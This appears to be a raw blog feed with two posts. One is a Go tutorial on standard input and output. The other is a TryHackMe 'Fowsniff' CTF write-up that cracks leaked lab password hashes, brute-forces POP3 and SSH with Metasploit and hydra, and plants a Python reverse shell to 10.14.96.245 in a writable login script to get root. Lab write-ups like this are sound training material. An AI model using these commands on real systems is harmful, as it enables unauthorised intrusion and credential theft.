class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">os.Stdin标准输入<br>os.Stdout标准输出<br>os.Stderr标准错误<br></code></pre></td></tr></table></figure><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>像读文件一样（麻烦）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> buf [<span class="hljs-number">1024</span>]<span class="hljs-type">byte</span><br>  n, _ := os.Stdin.Read(buf[:])<br>  os.Stdout.Write(buf[:n])<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt </code>包提供了几个函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 扫描从os.Stdin读入的文本，根据空格分隔，换行也被当作空格</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scan</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// 与Scan类似，但是遇到换行停止扫描</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanln</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// 根据格式化的字符串扫描</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>读取两个数字</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>  fmt.Scanln(&amp;a, &amp;b)<br>  fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><p>读取固定长度的数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  n := <span class="hljs-number">10</span><br>  s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, n)<br>  <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> n &#123;<br>    fmt.Scan(&amp;s[i])<br>  &#125;<br>  fmt.Println(s)<br>&#125;<br><br>&gt;&gt; <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br>&gt;&gt; [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><h3 id="bufio"><a href="#bufio" class="headerlink" title="bufio"></a>bufio</h3><p>有大量输入要读取的时建议使用 <code>bufio.Reader</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    reader := bufio.NewReader(os.Stdin)<br>    <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>    fmt.Fscanln(reader, &amp;a, &amp;b)<br>    fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h3><p>与 <code>bufio.Reader</code>  类似，不过它按行读取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  scanner := bufio.NewScanner(os.Stdin)<br>  <span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>    line := scanner.Text()<br>    <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;exit&quot;</span> &#123;<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;scan&quot;</span>, line)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span><br>scan <span class="hljs-number">1</span><br><span class="hljs-number">2</span><br>scan <span class="hljs-number">2</span><br><span class="hljs-number">3</span><br>scan <span class="hljs-number">3</span><br>exit<br></code></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>可以直接将字符串写入到标准输出中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;os&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>os.Stdout.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="print-println"><a href="#print-println" class="headerlink" title="print&#x2F;println"></a>print&#x2F;println</h3><p>go 中两个内置的函数 <code>print</code>，<code>println</code>，他们会将参数输出到标准错误中，仅做调试用，一般不推荐使用</p><h3 id="fmt-1"><a href="#fmt-1" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt</code> 包提供了 <code>fmt.Println</code> 函数，该函数默认会将参数输出到标准输出中。它的参数<strong>支持任意类型</strong>，如果类型实现了 <code>String</code> 接口也会调用 <code>String </code>方法来获取其字符串表现形式，所以它输出的内容可读性比较高，适用于大部分情况，不过由于内部用到了反射，在性能敏感的场景不建议大量使用。</p><h3 id="bufio-1"><a href="#bufio-1" class="headerlink" title="bufio"></a>bufio</h3><p><code>bufio </code>提供了可缓冲的输出方法，它会先将数据写入到内存中，积累到了一定阈值再输出到指定的 <code>Writer</code> 中，默认缓冲区大小是 <code>4KB</code>，在文件 IO，网络 IO 的时候使用比较好。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  writer := bufio.NewWriter(os.Stdout)<br>  <span class="hljs-keyword">defer</span> writer.Flush()<br>  writer.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>go 中的格式化输出功能基本上由 <code>fmt.Printf</code> 函数提供，跟 C 语言差不多。在 <code>%</code> 与格式化动词之间加上一个空格能达到分隔符的效果。</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Fowsniff CTF</title>
    <link href="/2025/01/21/Fowsniff/"/>
    <url>/2025/01/21/Fowsniff/</url>
    
    <content type="html"><![CDATA[<p>最近有点偷懒了owo </p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>先用 nmap 扫一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -T4 --min-rate <span class="hljs-number">1000</span> -sC -sV -p- <span class="hljs-number">10.10.108.176</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6fe50794710c00b6.png"></p><p>开放了 22、80、110、143 这4 个端口</p><p>访问一下发现了一个名叫 Fowsniff Corp 的公司，往下翻还能看见一条告示，大概意思是：@fowsniffcorp Twitter 账户被劫持了，上面可能会有敏感信息，那么我们去搜一下。</p><p><img src="https://img.dkdun.cn/v1/2025/12/24fa594eb2e4976d.png"></p><p>谷歌搜了一下，看描述找到了 twitter 发布的，点进去发现如下，有一个链接</p><p><img src="https://img.dkdun.cn/v1/2025/12/372908be9f9378be.png"></p><p>链接进去发现已经被下线了，只能看 WP 的信息了</p><p><img src="https://img.dkdun.cn/v1/2025/12/ec0ed336c8d9d0f9.png"></p><p>信息如下：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs applescript">FOWSNIFF CORP PASSWORD LEAK<br>            &#x27;&#x27;~``<br>           ( o o )<br>+<span class="hljs-comment">-----.oooO--(_)--Oooo.------+</span><br>|                            |<br>|          FOWSNIFF          |<br>|            got             |<br>|           PWN3D!!!         |<br>|                            |         <br>|       .oooO                |         <br>|        (   )   Oooo.       |         <br>+<span class="hljs-comment">---------\ (----(   )-------+</span><br>           \_)    ) /<br>                 (_/<br>FowSniff Corp got pwn3d <span class="hljs-keyword">by</span> B1gN1nj4!<br>No one <span class="hljs-keyword">is</span> safe <span class="hljs-keyword">from</span> <span class="hljs-keyword">my</span> <span class="hljs-number">1337</span> skillz!<br><br><br>mauer@fowsniff:<span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56<br>tegel@fowsniff:<span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen@fowsniff:<span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina@fowsniff:<span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd<br>mursten@fowsniff:<span class="hljs-number">0e9588</span>cb62f4b6f27e33d449e2ba0b3b<br>parede@fowsniff:<span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e<br><br>Fowsniff Corporation Passwords LEAKED!<br>FOWSNIFF CORP PASSWORD DUMP!<br><br>Here are their email passwords dumped <span class="hljs-keyword">from</span> their databases.<br>They left their pop3 server WIDE OPEN, too!<br><br>MD5 <span class="hljs-keyword">is</span> insecure, so you shouldn&#x27;t have trouble cracking them <span class="hljs-keyword">but</span> I was too lazy haha =P<br><br>l8r n00bz!<br><br>B1gN1nj4<br><br><span class="hljs-comment">-------------------------------------------------------------------------------------------------</span><br>This <span class="hljs-built_in">list</span> <span class="hljs-keyword">is</span> entirely fictional <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a Capture <span class="hljs-keyword">the</span> Flag educational challenge.<br><br>All information contained within <span class="hljs-keyword">is</span> invented solely <span class="hljs-keyword">for</span> this purpose <span class="hljs-keyword">and</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> correspond<br><span class="hljs-keyword">to</span> any <span class="hljs-built_in">real</span> persons <span class="hljs-keyword">or</span> organizations.<br><br>Any similarities <span class="hljs-keyword">to</span> actual people <span class="hljs-keyword">or</span> entities <span class="hljs-keyword">is</span> purely coincidental <span class="hljs-keyword">and</span> occurred accidentally.<br></code></pre></td></tr></table></figure><p>从上面信息中我们能发现泄露了电子邮件地址和密码 hash 值</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mauer<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:ae1644dac5b77c0cf51e0d26ad6d7e56</span><br>tegel<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:a92b8a29ef1183192e3d35187e0cfabd</span><br>mursten<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>e9588cb62f4b6f27e33d449e2ba0b3b<br>parede<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:f7fd98d380735e859f8b2ffbbede5a7e</span><br></code></pre></td></tr></table></figure><p>用 <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> 解出密码</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">8a28a94a588a95b80163709ab4313aa4</span>:mailcall<br><span class="hljs-attribute">ae1644dac5b77c0cf51e0d26ad6d7e56</span>:bilbo101<br><span class="hljs-attribute">1dc352435fecca338acfd4be10984009</span>:apples01<br><span class="hljs-attribute">19f5af754c31f1e2651edde9250d69bb</span>:skyler22<br><span class="hljs-attribute">90dc16d47114aa13671c697fd506cf26</span>:scoobydoo2<br>a92b8a29ef1183192e3d35187e0cfabd：这个没找到<br><span class="hljs-attribute">0e9588cb62f4b6f27e33d449e2ba0b3b</span>:carp4ever<br><span class="hljs-attribute">4d6e42f56e127803285a0a7649b5ab11</span>:orlando12<br><span class="hljs-attribute">f7fd98d380735e859f8b2ffbbede5a7e</span>:07011972<br></code></pre></td></tr></table></figure><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h2 id="Metasploit-hydra"><a href="#Metasploit-hydra" class="headerlink" title="Metasploit &amp; hydra"></a>Metasploit &amp; hydra</h2><p>现在已经有用户名和密码了，那么可以使用 Metasploit 的 <code>pop3_login</code> 模块，使用之前找到的信息来暴力破解 POP3 </p><p><img src="https://img.dkdun.cn/v1/2025/12/9e60709cb2963e6f.png"></p><p>将用户名和密码分别添加到 usernames.txt 和 passwords.txt 里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/pop3/pop3_login<br><span class="hljs-built_in">set</span> rhost 10.10.253.104 (因为中间有事情出门了所以回来重新开的机器)<br><span class="hljs-built_in">set</span> user_file /home/butt3rf1y/usernames.txt<br><span class="hljs-built_in">set</span> pass_file /home/butt3rf1y/passwords.txt<br>run<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/418d66c60817deff.png"></p><p>爆出来发现 1个帐户有效：<code>seina:scoobydoo2</code>（msf 好慢唉唉唉:( </p><p>登录邮箱查看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.253.104</span> <span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6aadde59584c0b29.png"></p><p>list 发现有两封邮件，查看一下。retr 1 读取第一封</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">Return</span>-Path: &lt;stone<span class="hljs-comment">@fowsniff&gt;</span><br><span class="hljs-comment">X-Original-To: seina@</span>fowsniff<br>Delivered-To: seina<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Received: by fowsniff (Postfix, from userid 1000)</span><br><span class="hljs-comment">        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)</span><br><span class="hljs-comment">To: baksteen@</span>fowsniff, mauer<span class="hljs-comment">@fowsniff, mursten@</span>fowsniff,<br>    mustikka<span class="hljs-comment">@fowsniff, parede@</span>fowsniff, sciana<span class="hljs-comment">@fowsniff, seina@</span>fowsniff,<br>    tegel<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Subject: URGENT! Security EVENT!</span><br><span class="hljs-comment">Message-Id: &lt;20180313185107.0FA3916A@</span>fowsniff&gt;<br><span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">07</span> <span class="hljs-number">-0400</span> (EDT)<br>From: stone<span class="hljs-comment">@fowsniff (stone)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Dear All,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A few days ago, a malicious actor was able to gain entry to</span><br><span class="hljs-comment">our internal email systems. The attacker was able to exploit</span><br><span class="hljs-comment">incorrectly filtered escape characters within our SQL database</span><br><span class="hljs-comment">to access our login credentials. Both the SQL and authentication</span><br><span class="hljs-comment">system used legacy methods that had not been updated in some time.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">We have been instructed to perform a complete internal system</span><br><span class="hljs-comment">overhaul. While the main systems are &quot;in the shop,&quot; we have</span><br><span class="hljs-comment">moved to this isolated, temporary server that has minimal</span><br><span class="hljs-comment">functionality.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This server is capable of sending and receiving emails, but only</span><br><span class="hljs-comment">locally. That means you can only send emails to other users, not</span><br><span class="hljs-comment">to the world wide web. You can, however, access this system via</span><br><span class="hljs-comment">the SSH protocol.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You MUST change this password as soon as possible, and you will do so under my</span><br><span class="hljs-comment">guidance. I saw the leak the attacker posted online, and I must say that your</span><br><span class="hljs-comment">passwords were not very secure.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Come see me in my office at your earliest convenience and we&#x27;ll set it up.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Thanks,</span><br><span class="hljs-comment">A.J Stone</span><br></code></pre></td></tr></table></figure><p>retr 2</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Return</span>-Path: &lt;baksteen@fowsniff&gt;<br>X-Original-<span class="hljs-keyword">To</span>: seina@fowsniff<br>Delivered-<span class="hljs-keyword">To</span>: seina@fowsniff<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">by</span> fowsniff (Postfix, <span class="hljs-keyword">from</span> userid <span class="hljs-number">1004</span>)<br>        id <span class="hljs-number">101</span>CA1AC2; Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">To:</span> seina@fowsniff<br><span class="hljs-symbol">Subject:</span> You missed out!<br>Message-Id: &lt;<span class="hljs-number">20180313185405.101</span>CA1AC2@fowsniff&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">From:</span> baksteen@fowsniff<br><br>Devin,<br><br>You should have seen the brass lay <span class="hljs-keyword">into</span> AJ today!<br>We are going <span class="hljs-keyword">to</span> be talking about this one <span class="hljs-keyword">for</span> a looooong time hahaha.<br>Who knew the regional manager had been <span class="hljs-keyword">in</span> the navy? She was swearing <span class="hljs-built_in">like</span> a sailor!<br><br>I don<span class="hljs-comment">&#x27;t know what kind of pneumonia or something you brought back with</span><br>you <span class="hljs-keyword">from</span> your camping trip, but I think I<span class="hljs-comment">&#x27;m coming down with it myself.</span><br>How <span class="hljs-type">long</span> have you been gone - a week?<br><span class="hljs-keyword">Next</span> time you<span class="hljs-comment">&#x27;re going to get sick and miss the managerial blowout of the century,</span><br>at least keep it <span class="hljs-keyword">to</span> yourself!<br><br>I<span class="hljs-comment">&#x27;m going to head home early and eat some chicken soup.</span><br>I think I just got an email <span class="hljs-keyword">from</span> Stone, too, but it<span class="hljs-comment">&#x27;s probably just some</span><br><span class="hljs-string">&quot;Let me explain the tone of my meeting with management&quot;</span> face-saving mail.<br>I<span class="hljs-comment">&#x27;ll read it when I get back.</span><br><br>Feel better,<br><br>Skyler<br><br><span class="hljs-symbol">PS:</span> Make sure you change your email password.<br>AJ had been telling us <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> that right before Captain Profanity showed up.<br></code></pre></td></tr></table></figure><p>综合来看，我们在第一封邮件里面发现了一句 “<strong>The temporary password for SSH is “<code>S1ck3nBluff+secureshell</code></strong>“”，一个临时密码</p><p>还有很多收件人“<strong>baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,mustikka@fowsniff, parede@fowsniff, sciana@fowsniff,seina@fowsniff,tegel@fowsniff</strong>”，创建一个 sshusers.txt 文件，用 hydra 来确认哪些用户没有改密码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hydra -L sshusers<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> S1ck3nBluff+secureshell ssh:<span class="hljs-comment">//10.10.253.104</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/10f2b0c72f5242b6.png"></p><p>由此确认用户 <code>bsksteen</code> 没有修改密码，现在可以直接 ssh 连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> baksteen@<span class="hljs-number">10.10.253.104</span><br></code></pre></td></tr></table></figure><p>连上之后发现 baksteen 属于 <code>users</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">find / -<span class="hljs-keyword">type</span> f -<span class="hljs-keyword">group</span> <span class="hljs-title">users</span> <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6376db1485fae637.png"></p><p>这里还有一个 shell 脚本，<code>/opt/cube/cube.sh</code>，看了一下就是登录时显示的那个图画，但是可以修改，意味着我们可以写反向 shell 了</p><h1 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h1><p>将下列 shell 写入 <code>/opt/cube/cube.sh</code> 脚本中保存</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python3 -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.14.96.245&quot;</span>,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p>退出重新登录，用 nc 监听弹 shell 的端口（我是用的 WSL，所以我直接用 Windows 的 ncat 监听的）</p><p>发现成功反弹弹了拥有 root 权限的 shell</p><p><img src="https://img.dkdun.cn/v1/2025/12/231d23c335df025c.png"></p><p>成功拿到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/e9f930db078e1a62.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅-基本语法</title>
    <link href="/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
